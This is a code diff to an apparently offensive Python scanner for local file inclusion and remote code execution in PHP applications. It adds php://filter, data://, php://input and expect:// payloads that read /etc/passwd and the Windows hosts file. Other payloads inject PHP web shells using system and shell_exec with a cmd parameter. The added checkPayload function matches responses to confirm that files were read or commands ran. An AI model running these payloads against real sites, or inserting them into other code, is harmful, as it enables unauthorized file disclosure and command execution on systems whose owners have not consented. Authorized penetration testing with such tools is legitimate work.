@@ -46,51 +46,83 @@ def test_wordlist(url):
     for line in f:
         line = line[:-1]
         if("DESTROY" in url):
-            url = url.replace("DESTROY", line)
+            u = url.replace("DESTROY", line)
 
-        res = requests.get(url, headers = headers)
+        res = requests.get(u, headers = headers)
         
-        if("root:x:0:0" in res.text or ":www-data:" in res.text):  
-                print("[+] LFI -> " + url)
-                
-                exploit = url+line
-                exploit = exploit.replace('/etc/passwd', '')
- 
-                return exploit
-        else:
-            exploit = None
+        if(checkPayload(res)):
+            print("[+] LFI -> " + u)
+            return  #To prevent further traffic
 
     f.close()
-    return exploit
 
 def test_php_filter(url):
+    
     #Test if parameter is vulnerable without encoding
     testCase = "php://filter/resource=/etc/passwd"
+    
     if("DESTROY" in url):
         u = url.replace("DESTROY", testCase)
 
     res = requests.get(u, headers = headers)
-    if("root:x:0:0" in res.text or ":www-data:" in res.text): 
+    
+    if(checkPayload(res)):
+        print("[+] LFI ->" + u)
+
+    winOne = "php://filter/resource=C:/Windows/System32/drivers/etc/hosts"
+    u = url.replace("DESTROY", winOne)
+    
+    res = requests.get(u, headers = headers)
+    if(checkPayload(res)):
         print("[+] LFI -> " + u)
+
 
     #Base64 Encoded
     testCaseTwo = "php://filter/convert.base64-encode/resource=/etc/passwd"
+    
     u = url.replace("DESTROY", testCaseTwo)
+
     res = requests.get(u, headers = headers)
-    if("cm9vdDp4OjA6MD" in res.text or "Ond3dy1kYXRhO" in res.text): 
+
+    if(checkPayload(res)):
         print("[+] LFI -> " + u)
 
-    testCaseThree = "php://filter/convert.iconv.utf-8.utf-16/resource=/etc/passwd"
-    u = u.replace("DESTROY", testCaseThree)
+    winTwo = "php://filter/convert.base64-encode/resource=C:/Windows/System32/drivers/etc/hosts"
+    u = url.replace("DESTROY", winTwo)
+    
     res = requests.get(u, headers = headers)
+    if(checkPayload(res)):
+        print("[+] LFI -> " + u)
 
-    if("root:x:0:0" in res.text or ":www-data:" in res.text):
+
+    #UTF-8/16 encoded
+    testCaseThree = "php://filter/convert.iconv.utf-8.utf-16/resource=/etc/passwd"
+    u = url.replace("DESTROY", testCaseThree)
+    
+    res = requests.get(u, headers = headers)
+    if(checkPayload(res)):
         print("[+] LFI -> " + u)
     
-    testCaseFour = "php://filter/read=string.rot13/resource=/etc/passwd"
-    u = u.replace("DESTROY", testCaseFour)
+    winThree = "php://filter/convert.iconv.utf-8.utf-16/resource=C:/Windows/System32/drivers/etc/hosts"
+    u = url.replace("DESTROY", winThree)
+
     res = requests.get(u, headers = headers)
-    if("ebbg:k:0:0" in res.text or "jjj-qngn:k" in res.text):
+    if(checkPayload(res)):
+        print("[+] LFI -> " + u)
+
+    #ROT13 encoded
+    testCaseFour = "php://filter/read=string.rot13/resource=/etc/passwd"
+    u = url.replace("DESTROY", testCaseFour)
+    res = requests.get(u, headers = headers)
+    
+    if(checkPayload(res)):
+        print("[+] LFI -> " + u)
+
+    winFour = "php://filter/read=string.rot13/resource=C:/Windows/System32/drivers/etc/hosts"
+    u = url.replace("DESTROY", winFour)
+    
+    res = requests.get(u, headers = headers)
+    if(checkPayload(res)):
         print("[+] LFI -> " + u)
 
 
@@ -100,7 +132,16 @@ def test_data_wrapper(url):
         u = url.replace("DESTROY", testCase)
 
     res = requests.get(u, headers = headers)
-    if("root:x:0:0" in res.text or ":www-data:" in res.text):
+    
+    if(checkPayload(res)):
+        print("[+] LFI -> " + u)
+
+    testCaseTwo = "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4K&c=ipconfig"
+    if("DESTROY" in url):
+        u = url.replace("DESTROY", testCaseTwo)
+    res = requests.get(u, headers = headers)
+
+    if(checkPayload(res)):
         print("[+] LFI -> " + u)
 
 
@@ -111,15 +152,29 @@ def test_php_input(url):
         u = url.replace("DESTROY", urlInput)
     
     res = requests.post(u, headers = headers, data= testCase)
-    if("root:x:0:0" in res.text or ":www-data:" in res.text):
+    
+    if(checkPayload(res)):
         print("[+] RCE -> " + u + " -> HTTP POST: " + testCase)
-
 
     testCaseTwo = "<?php echo shell_exec($_GET['cmd']) ?>"
     res = requests.post(u, headers = headers, data = testCaseTwo)
-    if("root:x:0:0" in res.text or ":www-data:" in res.text):
+    
+    if(checkPayload(res)):
         print("[+] RCE -> " + u + " -> HTTP POST: " + testCaseTwo)
 
+    #Windows
+    urlInputTwo = "php://input&cmd=ipconfig"
+    testCaseThree = "<? system('ipconfig');echo exec_($_GET['cmd']); ?>"
+    if("DESTROY" in url):
+        u = url.replace("DESTROY", testCaseThree)
+    
+    res = requests.post(u, headers = headers, data = testCaseThree)
+    if(checkPayload(res)):
+        print("[+] RCE -> " + u + " -> HTTP POST: " + testCaseThree)
+
+    res = requests.post(u, headers = headers, data = testCaseTwo) #Same POST payload
+    if(checkPayload(res)):
+        print("[+] RCE -> " + u + " -> HTTP POST: " + testCaseTwo)
 
 def test_expect_wrapper(url):
     testCase = "expect://cat%20%2Fetc%2Fpasswd"
@@ -127,10 +182,34 @@ def test_expect_wrapper(url):
         u = url.replace("DESTROY", testCase)
 
     res = requests.get(u, headers = headers)
-    if("root:x:0:0" in res.text or ":www-data:" in res.text):
+    
+    if(checkPayload(res)):
         print("[+] RCE -> " + u)
 
+    #Windows
+    testCaseTwo = "expect://ipconfig"
+    if("DESTROY" in url):
+        u = url.replace("DESTROY", testCaseTwo)
 
+    res = requests.get(u, headers = headers)
+    if(checkPayload(res)):
+        print("[+] RCE -> " + u)
+
+#You can add custom patterns in responses depending on the wordlist used
+#Checks if sent payload is executed
+def checkPayload(webResponse):
+    KEY_WORDS = ["root:x:0:0", "www-data:", "HTTP_USER_AGENT",
+            "cm9vdDp4OjA6MD", "Ond3dy1kYXRhO", "ebbg:k:0:0",
+            "jjj-qngn:k", "daemon:x:1:", "r o o t : x : 0 : 0",
+            "; for 16-bit app support", "sample HOSTS file used by Microsoft",
+            "Windows IP Configuration", "OyBmb3IgMT", "; sbe 16-ovg ncc fhccbeg",
+            ";  f o r  1 6 - b i t  a p p", "fnzcyr UBFGF svyr hfrq ol Zvpebfbsg",
+            "c2FtcGxlIEhPU1RT"]
+
+    for i in range(len(KEY_WORDS)):
+        if KEY_WORDS[i] in webResponse.text:
+            return True
+    return False
 
 def main():
 
